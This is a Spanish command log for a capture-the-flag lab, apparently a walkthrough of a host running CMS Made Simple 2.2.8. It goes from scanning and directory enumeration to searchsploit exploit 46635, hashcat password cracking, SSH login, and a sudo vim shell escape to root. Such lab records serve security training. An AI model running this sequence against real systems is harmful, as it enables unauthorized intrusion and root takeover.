# REGISTRO DE COMANDOS — LAB-014

## Reconocimiento
nmap -sV -Pn 10.67.146.11

## FTP
nmap -p 21 --script ftp-anon 10.67.146.11

## Enumeración web
gobuster dir -u http://10.67.146.11 -w /usr/share/wordlists/dirb/common.txt

## Identificación CMS
curl -s http://10.67.146.11/simple/ | grep -iE 'version|powered by|copyright'

## Exploit
searchsploit "CMS Made Simple 2.2.8"
searchsploit -x 46635

## Conversión
python3 -m fissix -w exploit.py

## Hashcat
hashcat -m 20 HASH:SALT /usr/share/wordlists/rockyou.txt

## SSH
ssh -p 2222 mitch@10.67.146.11

## Enumeración local
id
whoami
ls -la
sudo -l

## Escalada
sudo /usr/bin/vim
:!/bin/bash

## Verificación ROOT
id
whoami
cat /root/root.txt
